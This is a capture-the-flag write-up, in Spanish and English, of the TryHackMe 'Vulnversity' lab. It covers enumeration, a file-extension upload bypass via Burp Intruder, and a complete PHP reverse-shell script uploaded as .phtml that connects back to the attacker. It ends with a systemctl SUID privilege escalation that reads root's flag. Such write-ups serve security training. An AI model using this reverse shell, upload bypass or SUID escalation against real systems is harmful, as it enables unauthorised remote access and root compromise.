# Vulnversity — Writeup

**Fecha:** 28-09-2025 

**Plataforma:** TryHackMe

## TL;DR

Se encontraron servicios FTP, SSH, Samba y un servicio web con un directorio de subida (/internal). Subiendo un webshell .phtml se consiguió una reverse shell como www-data. Desde esa cuenta se escaló privilegios aprovechando /bin/systemctl con permiso SUID para ejecutar una unidad systemd que leyó /root/root.txt a /tmp/flag.

---

## Enumeration (nmap)

```bash
nmap -sV -sC --open $IP -oN scan.txt
```

**Comment:** `-sV` detecta versiones de servicios; `-sC` ejecuta scripts por defecto; `--open` muestra solo los puertos abiertos; `-oN` guarda la salida en un archivo normal.

**Result**
```bash
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 19:78:f4:6e:d8:11:72:e7:ba:60:0c:d2:ba:c9:a3:e7 (RSA)
|   256 e1:6e:3e:95:e0:bd:78:db:e9:aa:74:44:67:f0:a6:8e (ECDSA)
|_  256 8e:8d:24:7f:0d:77:52:20:40:2b:9e:ec:b3:e9:50:a8 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
3128/tcp open  http-proxy  Squid http proxy 4.10
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.10
3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Vuln University
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2025-09-27T20:40:34
|_  start_date: N/A
```
**Summary**

* 21/tcp open ftp (vsftpd/3.0.5)
* 22/tcp open  ssh (OpenSSH 8.2p1)
* 139/445/tcp open Samba (smbd)
* 3128/tcp open http-proxy (Squid/4.10)
* 3333/tcp open  http (Apache/2.4.41)

---

## Web Enumeration (Gobuster)

```bash
gobuster dir -u http://$IP:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

**Comment:** `-u` url target; `-w` ruta de wordlist.

**Result**
```bash
/images               (Status: 301) [Size: 322] [--> http://$IP:3333/images/]                                                                   
/css                  (Status: 301) [Size: 319] [--> http://$IP:3333/css/]                                                                      
/js                   (Status: 301) [Size: 318] [--> http://$IP:3333/js/]                                                                       
/internal             (Status: 301) [Size: 324] [--> http://$IP:3333/internal/] 
```
**Relevant Result**

* `/internal`, directorio web para subir archivos.
  
---

## Burp Suite

**Http POST**

Interceptamos la petición POST al subir un archivo a la web con el proxy de BurpSuite, la enviamos al Intruder y marcamos la extensión.
```bash
POST /internal/index.php HTTP/1.1
Host: $IP:3333
Content-Length: 291
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://$IP:3333
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJ8PkprBlb27KbdYV
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://$IP:3333/internal/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryJ8PkprBlb27KbdYV
Content-Disposition: form-data; name="file"; filename="test.§php§"
Content-Type: application/x-php

test

------WebKitFormBoundaryJ8PkprBlb27KbdYV
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundaryJ8PkprBlb27KbdYV--
```

**Find extension**

Aplicamos una wordlist de extensiones (phpext.txt) como payload para identificar la correcta:
<details>
	<summary><i>phpext.txt</i></summary>
		
		.php
		.php3
		.php4
		.php5
		.phtml
	
</details>

**Result**
* Extensión permitida: `.phtml`

---

## Foothold

**Reverse Shell**
<details><summary><i>php-reverse-shell.phtml</i></summary>

```bash	
	<?php
	set_time_limit (0);
	$VERSION = "1.0";
	$ip = '$IP';  // CHANGE THIS
	$port = 1234;       // CHANGE THIS
	$chunk_size = 1400;
	$write_a = null;
	$error_a = null;
	$shell = 'uname -a; w; id; /bin/sh -i';
	$daemon = 0;
	$debug = 0;
	
	//
	// Daemonise ourself if possible to avoid zombies later
	//
	
	// pcntl_fork is hardly ever available, but will allow us to daemonise
	// our php process and avoid zombies.  Worth a try...
	if (function_exists('pcntl_fork')) {
		// Fork and have the parent process exit
		$pid = pcntl_fork();
		
		if ($pid == -1) {
			printit("ERROR: Can't fork");
			exit(1);
		}
		
		if ($pid) {
			exit(0);  // Parent exits
		}
	
		// Make the current process a session leader
		// Will only succeed if we forked
		if (posix_setsid() == -1) {
			printit("Error: Can't setsid()");
			exit(1);
		}
	
		$daemon = 1;
	} else {
		printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
	}
	
	// Change to a safe directory
	chdir("/");
	
	// Remove any umask we inherited
	umask(0);
	
	//
	// Do the reverse shell...
	//
	
	// Open reverse connection
	$sock = fsockopen($ip, $port, $errno, $errstr, 30);
	if (!$sock) {
		printit("$errstr ($errno)");
		exit(1);
	}
	
	// Spawn shell process
	$descriptorspec = array(
	   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
	   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
	   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
	);
	
	$process = proc_open($shell, $descriptorspec, $pipes);
	
	if (!is_resource($process)) {
		printit("ERROR: Can't spawn shell");
		exit(1);
	}
	
	// Set everything to non-blocking
	// Reason: Occsionally reads will block, even though stream_select tells us they won't
	stream_set_blocking($pipes[0], 0);
	stream_set_blocking($pipes[1], 0);
	stream_set_blocking($pipes[2], 0);
	stream_set_blocking($sock, 0);
	
	printit("Successfully opened reverse shell to $ip:$port");
	
	while (1) {
		// Check for end of TCP connection
		if (feof($sock)) {
			printit("ERROR: Shell connection terminated");
			break;
		}
	
		// Check for end of STDOUT
		if (feof($pipes[1])) {
			printit("ERROR: Shell process terminated");
			break;
		}
	
		// Wait until a command is end down $sock, or some
		// command output is available on STDOUT or STDERR
		$read_a = array($sock, $pipes[1], $pipes[2]);
		$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	
		// If we can read from the TCP socket, send
		// data to process's STDIN
		if (in_array($sock, $read_a)) {
			if ($debug) printit("SOCK READ");
			$input = fread($sock, $chunk_size);
			if ($debug) printit("SOCK: $input");
			fwrite($pipes[0], $input);
		}
	
		// If we can read from the process's STDOUT
		// send data down tcp connection
		if (in_array($pipes[1], $read_a)) {
			if ($debug) printit("STDOUT READ");
			$input = fread($pipes[1], $chunk_size);
			if ($debug) printit("STDOUT: $input");
			fwrite($sock, $input);
		}
	
		// If we can read from the process's STDERR
		// send data down tcp connection
		if (in_array($pipes[2], $read_a)) {
			if ($debug) printit("STDERR READ");
			$input = fread($pipes[2], $chunk_size);
			if ($debug) printit("STDERR: $input");
			fwrite($sock, $input);
		}
	}
	
	fclose($sock);
	fclose($pipes[0]);
	fclose($pipes[1]);
	fclose($pipes[2]);
	proc_close($process);
	
	// Like print, but does nothing if we've daemonised ourself
	// (I can't figure out how to redirect STDOUT like a proper daemon)
	function printit ($string) {
		if (!$daemon) {
			print "$string\n";
		}
	}
	
	?>
```

</details>

**Upload reverse shell php**
```bash
	http://$IP:3333/internal/
```	

**Execute Payload**
```bash
	http://$IP:3333/internal/uploads/php-reverse-shell.phtml
```

**Listen Port**
```bash
	nc -lvnp 4444             
	listening on [any] 4444 ...
	connect to [$IP] from (UNKNOWN) [$IP] 45390
	Linux $IP 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
	 14:46:58 up 3 min,  0 users,  load average: 0.82, 0.38, 0.14
	USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	$ whoami
	www-data
```

**Upgrade Shell**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Privilege Escalation

**Find SUID Files**
```bash
 find / -user root -perm -4000 -exec ls -ldb {} \;
```
**Exploit systemctl**

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/flag"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```
**Cat Flag**
```bash
	$ cat /tmp/flag
```
